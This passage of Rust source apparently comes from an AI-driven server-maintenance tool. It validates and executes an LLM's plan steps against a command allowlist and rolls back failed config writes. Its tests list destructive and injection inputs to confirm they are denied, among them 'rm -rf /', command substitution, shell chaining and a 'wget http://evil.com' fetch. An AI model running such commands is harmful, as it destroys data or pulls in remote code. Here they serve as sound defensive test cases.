            .get_mut(plan_id)
            .ok_or_else(|| AppError::not_found(format!("plan {} 不存在", plan_id)))?;
        let step = execution
            .plan
            .steps
            .get_mut(step_index)
            .ok_or_else(|| AppError::invalid_argument("step 索引越界"))?;
        step.status = step_status;
        execution.plan.status = AiPlanStatus::Failed;
        let step_id = step.id.clone();
        let payload = build_step_event(
            &execution.session_id,
            &execution.plan_id,
            step_index,
            step,
            output,
            message,
        );
        (
            payload,
            plan_done_payload(&execution.session_id, &execution.plan_id, false),
            execution.plan.clone(),
            step_id,
        )
    };
    app.emit(EVENT_STEP, &payload).ok();
    app.emit(EVENT_DONE, &done_payload).ok();

    Ok(StepRunResult {
        plan,
        state: StepRunState::Done,
        current_step_id: Some(step_id),
    })
}

fn mark_step_failed_for_error(
    manager: &PlannerManager,
    app: &AppHandle,
    plan_id: &str,
    step_index: usize,
    error: AppError,
    message_prefix: &str,
) -> AppError {
    let message = format!("{message_prefix}: {}", error.message);
    if let Err(mark_error) = fail_step(
        manager,
        app,
        plan_id,
        step_index,
        AiStepStatus::Failed,
        None,
        Some(message),
    ) {
        tracing::warn!(
            plan_id = %plan_id,
            step_index,
            error = %mark_error,
            "failed to mark AI plan step as failed"
        );
    }
    error
}

async fn rollback_after_write_exception(
    manager: &PlannerManager,
    app: &AppHandle,
    plan_id: &str,
    session: &Arc<ManagedSession>,
    session_id: &str,
    pending: &PendingWrite,
    reason: String,
) -> AppResult<StepRunResult> {
    rollback_after_write_problem(
        manager,
        app,
        plan_id,
        session,
        session_id,
        pending,
        RollbackProblem {
            reason,
            success_prefix: "write 执行异常，已自动回滚。snapshot",
            failure_prefix: "write 执行异常且自动回滚失败",
            output: None,
        },
    )
    .await
}

async fn rollback_after_verify_error(
    manager: &PlannerManager,
    app: &AppHandle,
    plan_id: &str,
    session: &Arc<ManagedSession>,
    session_id: &str,
    pending: &PendingWrite,
    reason: String,
) -> AppResult<StepRunResult> {
    rollback_after_write_problem(
        manager,
        app,
        plan_id,
        session,
        session_id,
        pending,
        RollbackProblem {
            reason,
            success_prefix: "verify 执行异常，write 已自动回滚。snapshot",
            failure_prefix: "verify 执行异常且自动回滚失败",
            output: None,
        },
    )
    .await
}

async fn rollback_after_verify_failure(
    manager: &PlannerManager,
    app: &AppHandle,
    plan_id: &str,
    session: &Arc<ManagedSession>,
    session_id: &str,
    pending: &PendingWrite,
    output: &ProbeOutput,
) -> AppResult<StepRunResult> {
    emit_service_warning(
        app,
        session_id,
        plan_id,
        &pending.step_id,
        "verify 失败，文件将自动回滚；服务状态仍需人工检查",
        Some(pending.snapshot.snapshot_dir.display().to_string()),
    );

    let rollback_result = rollback_snapshot_with_progress(
        app,
        session,
        session_id,
        plan_id,
        &pending.step_id,
        &pending.snapshot,
    )
    .await?;

    let (status, message) = match rollback_result {
        Ok(()) => (
            AiStepStatus::RolledBack,
            format!(
                "verify 失败（exit={:?}），write 已自动回滚。snapshot: {}",
                output.exit_code,
                pending.snapshot.snapshot_dir.display()
            ),
        ),
        Err(error) => (
            AiStepStatus::Failed,
            format!(
                "verify 失败且自动回滚失败: {}; snapshot: {}",
                error.message,
                pending.snapshot.snapshot_dir.display()
            ),
        ),
    };

    fail_step(
        manager,
        app,
        plan_id,
        pending.step_index,
        status,
        Some(output),
        Some(message),
    )
}

async fn rollback_after_write_problem(
    manager: &PlannerManager,
    app: &AppHandle,
    plan_id: &str,
    session: &Arc<ManagedSession>,
    session_id: &str,
    pending: &PendingWrite,
    problem: RollbackProblem<'_>,
) -> AppResult<StepRunResult> {
    emit_service_warning(
        app,
        session_id,
        plan_id,
        &pending.step_id,
        &problem.reason,
        Some(pending.snapshot.snapshot_dir.display().to_string()),
    );

    let rollback_result = rollback_snapshot_with_progress(
        app,
        session,
        session_id,
        plan_id,
        &pending.step_id,
        &pending.snapshot,
    )
    .await?;

    let (status, message) = match rollback_result {
        Ok(()) => (
            AiStepStatus::RolledBack,
            format!(
                "{}: {}",
                problem.success_prefix,
                pending.snapshot.snapshot_dir.display()
            ),
        ),
        Err(error) => (
            AiStepStatus::Failed,
            format!(
                "{}: {}; snapshot: {}",
                problem.failure_prefix,
                error.message,
                pending.snapshot.snapshot_dir.display()
            ),
        ),
    };

    fail_step(
        manager,
        app,
        plan_id,
        pending.step_index,
        status,
        problem.output,
        Some(message),
    )
}

async fn rollback_snapshot_with_progress(
    app: &AppHandle,
    session: &Arc<ManagedSession>,
    session_id: &str,
    plan_id: &str,
    step_id: &str,
    bundle: &SnapshotBundle,
) -> AppResult<AppResult<()>> {
    let session_for_rollback = session.clone();
    let bundle_for_rollback = bundle.clone();
    let session_id_for_emit = session_id.to_string();
    let plan_id_for_emit = plan_id.to_string();
    let step_id_for_emit = step_id.to_string();
    let app_for_emit = app.clone();

    tokio::task::spawn_blocking(move || {
        rollback_snapshot(&session_for_rollback, &bundle_for_rollback, |progress| {
            app_for_emit
                .emit(
                    EVENT_ROLLBACK_PROGRESS,
                    &AiRollbackProgressPayload {
                        session_id: session_id_for_emit.clone(),
                        plan_id: plan_id_for_emit.clone(),
                        step_id: step_id_for_emit.clone(),
                        current_path: progress.current_path,
                        restored_files: progress.restored_files,
                        total_files: progress.total_files,
                        snapshot_path: bundle_for_rollback.snapshot_dir.display().to_string(),
                    },
                )
                .ok();
        })
    })
    .await
    .map_err(|e| AppError::new(ErrorCode::Unknown, format!("rollback task failed: {e}")))
}

fn emit_service_warning(
    app: &AppHandle,
    session_id: &str,
    plan_id: &str,
    step_id: &str,
    warning: &str,
    snapshot_path: Option<String>,
) {
    app.emit(
        EVENT_SERVICE_STATE_WARNING,
        &AiServiceStateWarningPayload {
            session_id: session_id.to_string(),
            plan_id: plan_id.to_string(),
            step_id: step_id.to_string(),
            warning: warning.to_string(),
            snapshot_path,
        },
    )
    .ok();
}

fn plan_done_payload(session_id: &str, plan_id: &str, canceled: bool) -> AiDonePayload {
    AiDonePayload {
        kind: AiDoneKind::Plan,
        session_id: session_id.to_string(),
        message_id: None,
        plan_id: Some(plan_id.to_string()),
        truncated: false,
        canceled,
    }
}

fn build_step_event(
    session_id: &str,
    plan_id: &str,
    step_index: usize,
    step: &AiStep,
    output: Option<&ProbeOutput>,
    message: Option<String>,
) -> AiStepEventPayload {
    AiStepEventPayload {
        session_id: session_id.to_string(),
        plan_id: plan_id.to_string(),
        step_id: step.id.clone(),
        step_index: step_index as u32,
        kind: step.kind,
        status: step.status,
        stdout: output.map(|o| o.stdout.clone()),
        stderr: output.map(|o| o.stderr.clone()),
        exit_code: output.and_then(|o| o.exit_code),
        message,
    }
}

fn write_target_path(step: &AiStep) -> AppResult<String> {
    step.path
        .clone()
        .or_else(|| step.target_files.first().cloned())
        .ok_or_else(|| AppError::invalid_argument("write step 缺少 target path"))
}

fn checked_verify_command(step: &AiStep) -> AppResult<CheckedCommand> {
    match step.verify_template.clone() {
        Some(AiVerifyTemplate::NginxCheck) => Ok(CheckedCommand {
            argv: vec!["nginx".to_string(), "-t".to_string()],
        }),
        Some(AiVerifyTemplate::SystemctlIsActive) => {
            let service = step.command.trim();
            if service.is_empty() {
                return Err(AppError::invalid_argument(
                    "systemctl_is_active verify 需要 command 提供服务名",
                ));
            }
            if service.starts_with("systemctl ") {
                let argv = template_checked_argv(service)?;
                if argv.first().map(String::as_str) != Some("systemctl")
                    || argv.get(1).map(String::as_str) != Some("is-active")
                    || argv.len() != 3
                {
                    return Err(AppError::invalid_argument(
                        "systemctl_is_active 模板只允许 systemctl is-active <service>",
                    ));
                }
                Ok(CheckedCommand { argv })
            } else {
                Ok(CheckedCommand {
                    argv: vec![
                        "systemctl".to_string(),
                        "is-active".to_string(),
                        service.to_string(),
                    ],
                })
            }
        }
        Some(AiVerifyTemplate::CurlHead) => {
            let target = step.command.trim();
            if target.is_empty() {
                return Err(AppError::invalid_argument(
                    "curl_head verify 需要 command 提供 URL",
                ));
            }
            if is_http_url(target) {
                Ok(CheckedCommand {
                    argv: vec![
                        "curl".to_string(),
                        "-I".to_string(),
                        "--max-time".to_string(),
                        "10".to_string(),
                        target.to_string(),
                    ],
                })
            } else {
                let argv = template_checked_argv(target)?;
                if argv.first().map(String::as_str) != Some("curl")
                    || argv.get(1).map(String::as_str) != Some("-I")
                    || argv.len() != 3
                    || !is_http_url(&argv[2])
                {
                    return Err(AppError::invalid_argument(
                        "curl_head 模板只允许 curl -I <http-url> 或原始 URL",
                    ));
                }
                Ok(CheckedCommand { argv })
            }
        }
        Some(AiVerifyTemplate::Custom(command)) => allowlist_checked(&command),
        None => Err(AppError::invalid_argument(
            "verify step 缺少 verifyTemplate",
        )),
    }
}

fn template_checked_argv(command: &str) -> AppResult<Vec<String>> {
    allowlist::parse_argv(command).map_err(AppError::allowlist_denied)
}

fn is_http_url(value: &str) -> bool {
    value.starts_with("http://") || value.starts_with("https://")
}

fn allowlist_checked(command: &str) -> AppResult<CheckedCommand> {
    match allowlist::check(command) {
        allowlist::Decision::Allow(checked) => Ok(checked),
        allowlist::Decision::RequireConfirm(checked) => Ok(checked),
        allowlist::Decision::Deny(reason) => Err(AppError::allowlist_denied(reason)),
    }
}

fn step_index_of_pending(pending: &PendingConfirm) -> usize {
    match pending {
        PendingConfirm::Write(item) => item.step_index,
        PendingConfirm::Action(item) => item.step_index,
    }
}

fn ensure_revisable_status(status: AiStepStatus) -> AppResult<()> {
    match status {
        AiStepStatus::Running | AiStepStatus::Executing | AiStepStatus::Verifying => {
            Err(AppError::invalid_argument("step 正在进行中，拒绝 revise"))
        }
        _ => Ok(()),
    }
}

fn build_revise_prompt(
    current_plan: &AiPlan,
    current_step_index: usize,
    new_observation: &str,
) -> AppResult<String> {
    let current_plan_json = serde_json::to_string_pretty(current_plan)
        .map_err(|e| AppError::invalid_argument(format!("plan serialize failed: {e}")))?;
    let user_text = format!(
        "Revise the remaining plan only.\n\
Current full plan JSON:\n{current_plan_json}\n\n\
Current step index: {current_step_index}\n\
Completed steps before this index are fixed and must NOT be repeated.\n\
Return a replacement suffix plan using the same JSON schema.\n\
The first step in your output becomes the new current step.\n\
All returned commands must remain within the existing safe plan constraints.\n\
New observation:\n{}",
        new_observation.trim()
    );
    Ok(prompt::build_budgeted(
        &PromptInput {
            user_text,
            context: None,
            history: Vec::new(),
        },
        PromptMode::Plan,
    ))
}

fn validate_plan_steps(plan: &AiPlan) -> AppResult<()> {
    if plan.steps.is_empty() {
        return Err(AppError::invalid_argument("plan 至少需要一个 step"));
    }

    for step in &plan.steps {
        match step.kind {
            AiStepKind::Probe => {
                let _ = dispatch_probe_step(step)?;
            }
            AiStepKind::Write => {
                write_target_path(step)?;
                let _ = step
                    .content
                    .as_ref()
                    .ok_or_else(|| AppError::invalid_argument("write step 缺少 content"))?;
                if step.verify_template.is_some() {
                    let _ = checked_verify_command(step)?;
                }
            }
            AiStepKind::Verify => {
                let _ = checked_verify_command(step)?;
            }
            AiStepKind::Action => {
                let _ = dispatch_action_step(step)?;
            }
        }
    }
    Ok(())
}

fn validate_revised_suffix(plan: &AiPlan) -> AppResult<()> {
    validate_plan_steps(plan)
}

/// 从 LLM 原始输出解析 `AiPlan`。
///
/// 容忍：
/// - ` ``` json ... ``` ` markdown fences
/// - 首尾空白
/// - JSON 后跟随的额外文本（截取到第一个顶层 `}` 为止）
///
/// 失败时返回 `Err(String)` 描述原因，调用方可按 `PLAN_MAX_RETRIES` 重试。
pub fn parse_plan_response(raw: &str) -> Result<AiPlan, String> {
    let trimmed = raw.trim();

    let json_str = if let Some(inner) = strip_fence(trimmed) {
        inner.trim()
    } else {
        trimmed
    };

    let json_str = extract_first_object(json_str).unwrap_or(json_str);

    let mut value = serde_json::from_str::<serde_json::Value>(json_str)
        .map_err(|e| format!("plan JSON parse error: {e}\nraw input: {raw}"))?;
    normalize_plan_json(&mut value);
    let mut plan = serde_json::from_value::<AiPlan>(value)
        .map_err(|e| format!("plan JSON parse error: {e}\nraw input: {raw}"))?;

    for step in &mut plan.steps {
        step.normalize();
    }

    Ok(plan)
}

/// 兼容历史 / 过渡中的 schema 噪音：
/// - 非 verify 步会给 `verifyTemplate: ""`，先转成缺省再反序列化
fn normalize_plan_json(value: &mut serde_json::Value) {
    let Some(steps) = value
        .get_mut("steps")
        .and_then(serde_json::Value::as_array_mut)
    else {
        return;
    };

    for step in steps {
        let Some(obj) = step.as_object_mut() else {
            continue;
        };
        let should_remove = obj
            .get("verifyTemplate")
            .and_then(serde_json::Value::as_str)
            .is_some_and(|s| s.trim().is_empty());
        if should_remove {
            obj.remove("verifyTemplate");
        }
    }
}

/// Probe step 的 executor 权威判定（T2.10 / SPEC §5）。
pub fn dispatch_probe_step(step: &AiStep) -> AppResult<CheckedCommand> {
    let command = match step.kind {
        AiStepKind::Probe => step.command.as_str(),
        AiStepKind::Write | AiStepKind::Verify | AiStepKind::Action => {
            return Err(AppError::new(
                ErrorCode::InvalidArgument,
                "dispatch_probe_step 只接受 Probe 步骤",
            ));
        }
    };

    match allowlist::check(command) {
        allowlist::Decision::Allow(checked) => Ok(checked),
        allowlist::Decision::RequireConfirm(_checked) => Err(AppError::allowlist_denied(format!(
            "命令需要用户确认才能执行（当前阶段禁止）: {}",
            command
        ))),
        allowlist::Decision::Deny(reason) => Err(AppError::allowlist_denied(format!(
            "{}: {}",
            reason, command
        ))),
    }
}

pub fn dispatch_action_step(step: &AiStep) -> AppResult<CheckedCommand> {
    let command = match step.kind {
        AiStepKind::Action => step.command.as_str(),
        AiStepKind::Probe | AiStepKind::Write | AiStepKind::Verify => {
            return Err(AppError::new(
                ErrorCode::InvalidArgument,
                "dispatch_action_step 只接受 Action 步骤",
            ));
        }
    };

    match allowlist::check_action(command) {
        allowlist::Decision::RequireConfirm(checked) | allowlist::Decision::Allow(checked) => {
            Ok(checked)
        }
        allowlist::Decision::Deny(reason) => Err(AppError::allowlist_denied(format!(
            "{}: {}",
            reason, command
        ))),
    }
}

fn strip_fence(s: &str) -> Option<&str> {
    let s = if let Some(stripped) = s.strip_prefix("```json") {
        stripped
    } else if let Some(stripped) = s.strip_prefix("```") {
        stripped
    } else {
        return None;
    };
    let s = s.trim_start_matches('\n');
    if let Some(end) = s.rfind("```") {
        Some(&s[..end])
    } else {
        Some(s)
    }
}

fn extract_first_object(s: &str) -> Option<&str> {
    let start = s.find('{')?;
    let mut depth: i32 = 0;
    let mut in_string = false;
    let mut escape = false;
    let bytes = s.as_bytes();
    for (i, &b) in bytes[start..].iter().enumerate() {
        if escape {
            escape = false;
            continue;
        }
        match b {
            b'\\' if in_string => escape = true,
            b'"' => in_string = !in_string,
            b'{' if !in_string => depth += 1,
            b'}' if !in_string => {
                depth -= 1;
                if depth == 0 {
                    return Some(&s[start..=start + i]);
                }
            }
            _ => {}
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::services::ai::prompt::PLAN_SYSTEM_PROMPT;
    use std::sync::atomic::{AtomicUsize, Ordering};

    fn probe(cmd: &str) -> AiStep {
        AiStep::probe(cmd)
    }

    fn write_step(path: &str, content: &str) -> AiStep {
        AiStep::write(path, content)
    }

    fn action(cmd: &str) -> AiStep {
        AiStep::action(cmd)
    }

    #[test]
    fn parse_minimal_probe_plan() {
        let raw = r#"{"steps":[{"kind":"probe","command":"cat /etc/nginx/nginx.conf"}]}"#;
        let plan = parse_plan_response(raw).unwrap();
        assert_eq!(plan.steps, vec![probe("cat /etc/nginx/nginx.conf")]);
    }

    #[test]
    fn parse_probe_and_write_plan() {
        let raw = r#"{
            "steps": [
                {"kind": "probe", "command": "cat /etc/nginx/nginx.conf"},
                {"kind": "write", "path": "/etc/nginx/nginx.conf", "content": "server { listen 80; }"}
            ]
        }"#;
        let plan = parse_plan_response(raw).unwrap();
        assert_eq!(
            plan.steps,
            vec![
                probe("cat /etc/nginx/nginx.conf"),
                write_step("/etc/nginx/nginx.conf", "server { listen 80; }"),
            ]
        );
    }

    #[test]
    fn parse_plan_with_action_step() {
        let raw = r#"{
            "steps": [
                {"kind": "probe", "command": "cat /etc/nginx/nginx.conf"},
                {"kind": "action", "command": "nginx -s reload"}
            ]
        }"#;
        let plan = parse_plan_response(raw).unwrap();
        assert_eq!(
            plan.steps,
            vec![
                probe("cat /etc/nginx/nginx.conf"),
                action("nginx -s reload")
            ]
        );
    }

    #[test]
    fn parse_with_markdown_json_fence() {
        let raw = "```json\n{\"steps\":[{\"kind\":\"probe\",\"command\":\"df -h\"}]}\n```";
        let plan = parse_plan_response(raw).unwrap();
        assert_eq!(plan.steps, vec![probe("df -h")]);
    }

    #[test]
    fn parse_with_plain_code_fence() {
        let raw = "```\n{\"steps\":[{\"kind\":\"probe\",\"command\":\"ps aux\"}]}\n```";
        let plan = parse_plan_response(raw).unwrap();
        assert_eq!(plan.steps, vec![probe("ps aux")]);
    }

    #[test]
    fn parse_with_trailing_text_after_json() {
        let raw = r#"{"steps":[{"kind":"probe","command":"ls /"}]} Here is my plan."#;
        let plan = parse_plan_response(raw).unwrap();
        assert_eq!(plan.steps, vec![probe("ls /")]);
    }

    #[test]
    fn parse_empty_steps_is_valid() {
        let raw = r#"{"steps":[]}"#;
        let plan = parse_plan_response(raw).unwrap();
        assert!(plan.steps.is_empty());
    }

    #[test]
    fn parse_invalid_json_returns_err() {
        let raw = "not json at all";
        assert!(parse_plan_response(raw).is_err());
    }

    #[test]
    fn parse_unknown_step_kind_returns_err() {
        let raw = r#"{"steps":[{"kind":"delete","path":"/etc/passwd"}]}"#;
        assert!(parse_plan_response(raw).is_err());
    }

    #[test]
    fn parse_t3_plan_metadata_and_verify_template() {
        let raw = r#"{
            "summary": "检查 nginx 并验证配置",
            "steps": [
                {
                    "id": "step-1",
                    "kind": "probe",
                    "intent": "读取当前配置",
                    "command": "cat /etc/nginx/nginx.conf",
                    "expectedObservation": "看到 gzip 配置"
                },
                {
                    "id": "step-2",
                    "kind": "verify",
                    "verifyTemplate": "nginx_check",
                    "expectedObservation": "nginx -t 成功"
                }
            ],
            "risks": ["reload 可能失败"],
            "assumptions": ["服务名为 nginx"]
        }"#;
        let plan = parse_plan_response(raw).unwrap();
        assert_eq!(plan.summary, "检查 nginx 并验证配置");
        assert_eq!(plan.risks, vec!["reload 可能失败"]);
        assert_eq!(plan.assumptions, vec!["服务名为 nginx"]);
        assert_eq!(plan.steps[1].kind, AiStepKind::Verify);
        assert_eq!(
            plan.steps[1].verify_template,
            Some(AiVerifyTemplate::NginxCheck)
        );
    }

    #[test]
    fn verify_templates_expand_to_expected_commands() {
        let mut step = AiStep::verify(AiVerifyTemplate::SystemctlIsActive);
        step.command = "nginx".to_string();
        assert_eq!(
            checked_verify_command(&step).unwrap().argv,
            vec!["systemctl", "is-active", "nginx"]
        );

        let mut step = AiStep::verify(AiVerifyTemplate::CurlHead);
        step.command = "https://example.com".to_string();
        assert_eq!(
            checked_verify_command(&step).unwrap().argv,
            vec!["curl", "-I", "--max-time", "10", "https://example.com"]
        );
    }

    #[test]
    fn verify_templates_accept_documented_full_commands() {
        let mut step = AiStep::verify(AiVerifyTemplate::SystemctlIsActive);
        step.command = "systemctl is-active nginx".to_string();
        assert_eq!(
            checked_verify_command(&step).unwrap().argv,
            vec!["systemctl", "is-active", "nginx"]
        );

        let mut step = AiStep::verify(AiVerifyTemplate::CurlHead);
        step.command = "curl -I https://example.com".to_string();
        assert_eq!(
            checked_verify_command(&step).unwrap().argv,
            vec!["curl", "-I", "https://example.com"]
        );
    }

    #[test]
    fn plan_max_retries_constant_is_two() {
        assert_eq!(PLAN_MAX_RETRIES, 2);
    }

    #[tokio::test]
    async fn generate_plan_with_retries_after_invalid_json() {
        let attempts = Arc::new(AtomicUsize::new(0));
        let attempts_for_generator = attempts.clone();

        let plan = generate_plan_with(
            "session-1",
            "fix nginx config",
            None,
            512,
            move |prompt, _max_tokens| {
                let attempts = attempts_for_generator.clone();
                async move {
                    let attempt = attempts.fetch_add(1, Ordering::SeqCst);
                    if attempt == 0 {
                        assert!(!prompt.contains("previous plan-mode response was invalid JSON"));
                        Ok("not json".to_string())
                    } else {
                        assert!(prompt.contains("previous plan-mode response was invalid JSON"));
                        Ok(
                            r#"{"steps":[{"kind":"probe","command":"cat /etc/nginx/nginx.conf"}]}"#
                                .to_string(),
                        )
                    }
                }
            },
        )
        .await
        .unwrap();

        assert_eq!(attempts.load(Ordering::SeqCst), 2);
        assert_eq!(plan.steps.len(), 1);
        assert_eq!(plan.steps[0].id, "step-1");
        assert_eq!(plan.steps[0].command, "cat /etc/nginx/nginx.conf");
    }

    #[tokio::test]
    async fn generate_plan_with_retries_after_validation_failure() {
        let attempts = Arc::new(AtomicUsize::new(0));
        let attempts_for_generator = attempts.clone();

        let plan = generate_plan_with(
            "session-1",
            "fix nginx config",
            None,
            512,
            move |prompt, _max_tokens| {
                let attempts = attempts_for_generator.clone();
                async move {
                    let attempt = attempts.fetch_add(1, Ordering::SeqCst);
                    if attempt == 0 {
                        Ok(r#"{"steps":[{"kind":"probe","command":"rm -rf /"}]}"#.to_string())
                    } else {
                        assert!(prompt.contains("plan validation error"));
                        Ok(
                            r#"{"steps":[{"kind":"probe","command":"cat /etc/nginx/nginx.conf"}]}"#
                                .to_string(),
                        )
                    }
                }
            },
        )
        .await
        .unwrap();

        assert_eq!(attempts.load(Ordering::SeqCst), 2);
        assert_eq!(plan.steps.len(), 1);
        assert_eq!(plan.steps[0].command, "cat /etc/nginx/nginx.conf");
    }

    #[tokio::test]
    async fn generate_plan_with_retries_after_empty_steps() {
        let attempts = Arc::new(AtomicUsize::new(0));
        let attempts_for_generator = attempts.clone();

        let plan = generate_plan_with(
            "session-1",
            "fix nginx config",
            None,
            512,
            move |prompt, _max_tokens| {
                let attempts = attempts_for_generator.clone();
                async move {
                    let attempt = attempts.fetch_add(1, Ordering::SeqCst);
                    if attempt == 0 {
                        Ok(r#"{"steps":[]}"#.to_string())
                    } else {
                        assert!(prompt.contains("plan validation error"));
                        Ok(
                            r#"{"steps":[{"kind":"probe","command":"cat /etc/nginx/nginx.conf"}]}"#
                                .to_string(),
                        )
                    }
                }
            },
        )
        .await
        .unwrap();

        assert_eq!(attempts.load(Ordering::SeqCst), 2);
        assert_eq!(plan.steps.len(), 1);
        assert_eq!(plan.steps[0].command, "cat /etc/nginx/nginx.conf");
    }

    #[tokio::test]
    async fn generate_plan_with_stops_after_retry_budget() {
        let attempts = Arc::new(AtomicUsize::new(0));
        let attempts_for_generator = attempts.clone();

        let err = generate_plan_with(
            "session-1",
            "fix nginx config",
            None,
            512,
            move |_prompt, _max_tokens| {
                let attempts = attempts_for_generator.clone();
                async move {
                    attempts.fetch_add(1, Ordering::SeqCst);
                    Ok("still not json".to_string())
                }
            },
        )
        .await
        .unwrap_err();

        assert_eq!(
            attempts.load(Ordering::SeqCst),
            (PLAN_MAX_RETRIES + 1) as usize
        );
        assert_eq!(err.code, ErrorCode::InvalidArgument);
        assert!(err.message.contains("after 3 attempts"));
    }

    #[test]
    fn dispatch_allows_safe_probe_command() {
        let step = probe("cat /etc/nginx/nginx.conf");
        let result = dispatch_probe_step(&step);
        assert!(
            result.is_ok(),
            "safe probe must be allowed, got: {result:?}"
        );
        let checked = result.unwrap();
        assert_eq!(checked.argv, vec!["cat", "/etc/nginx/nginx.conf"]);
    }

    #[test]
    fn dispatch_denies_destructive_command() {
        let step = probe("rm -rf /");
        let result = dispatch_probe_step(&step);
        assert!(result.is_err(), "rm must be denied");
        let err = result.unwrap_err();
        assert_eq!(err.code, ErrorCode::AllowlistDenied);
    }

    #[test]
    fn dispatch_denies_systemctl_non_status_subcommand() {
        let step = probe("systemctl restart nginx");
        let result = dispatch_probe_step(&step);
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert_eq!(err.code, ErrorCode::AllowlistDenied);
    }

    #[test]
    fn dispatch_write_step_returns_invalid_argument() {
        let step = AiStep::write("/etc/nginx/nginx.conf", "server {}");
        let result = dispatch_probe_step(&step);
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert_eq!(err.code, ErrorCode::InvalidArgument);
    }

    #[test]
    fn dispatch_action_allows_nginx_reload() {
        let step = action("nginx -s reload");
        let checked = dispatch_action_step(&step).unwrap();
        assert_eq!(checked.argv, vec!["nginx", "-s", "reload"]);
    }

    #[test]
    fn dispatch_action_rejects_restart() {
        let step = action("systemctl restart nginx");
        let result = dispatch_action_step(&step);
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert_eq!(err.code, ErrorCode::AllowlistDenied);
    }

    #[test]
    fn revisable_status_rejects_running_states() {
        let result = ensure_revisable_status(AiStepStatus::Running);
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert_eq!(err.code, ErrorCode::InvalidArgument);
    }

    #[test]
    fn revise_prompt_mentions_current_step_and_observation() {
        let plan = AiPlan {
            summary: "x".to_string(),
            steps: vec![probe("cat /etc/nginx/nginx.conf")],
            risks: vec![],
            assumptions: vec![],
            status: AiPlanStatus::Ready,
        };
        let prompt = build_revise_prompt(&plan, 2, "nginx -t failed after edit").unwrap();
        assert!(prompt.contains("Current step index: 2"));
        assert!(prompt.contains("nginx -t failed after edit"));
        assert!(prompt.contains(PLAN_SYSTEM_PROMPT));
    }

    #[test]
    fn validate_revised_suffix_rechecks_action_allowlist() {
        let plan = AiPlan {
            summary: "x".to_string(),
            steps: vec![action("systemctl restart nginx")],
            risks: vec![],
            assumptions: vec![],
            status: AiPlanStatus::Ready,
        };
        let result = validate_revised_suffix(&plan);
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert_eq!(err.code, ErrorCode::AllowlistDenied);
    }

    #[test]
    fn fuzz_empty_command() {
        assert!(dispatch_probe_step(&probe("")).is_err());
    }

    #[test]
    fn fuzz_command_substitution() {
        assert!(dispatch_probe_step(&probe("ls $(rm -rf /)")).is_err());
    }

    #[test]
    fn fuzz_pipeline_injection() {
        assert!(dispatch_probe_step(&probe("ls | rm x")).is_err());
    }

    #[test]
    fn fuzz_semicolon_injection() {
        assert!(dispatch_probe_step(&probe("ls; rm -rf /")).is_err());
    }

    #[test]
    fn fuzz_shell_interpreter_call() {
        assert!(dispatch_probe_step(&probe("bash -c 'rm -rf /'")).is_err());
    }

    #[test]
    fn fuzz_redirect_to_sensitive_file() {
        assert!(dispatch_probe_step(&probe("ls > /etc/passwd")).is_err());
    }

    #[test]
    fn fuzz_eval_injection() {
        assert!(dispatch_probe_step(&probe("eval \"rm x\"")).is_err());
    }

    #[test]
    fn fuzz_command_not_in_allowlist() {
        assert!(dispatch_probe_step(&probe("wget http://evil.com")).is_err());
    }

    #[test]
    fn fuzz_unicode_direction_override_in_command() {
        assert!(dispatch_probe_step(&probe("ls\u{202E}rm")).is_err());
    }

    #[test]
    fn fuzz_oversized_command() {
        let long = "cat ".to_string() + &"a".repeat(10_001);
        assert!(dispatch_probe_step(&probe(&long)).is_err());
    }
}
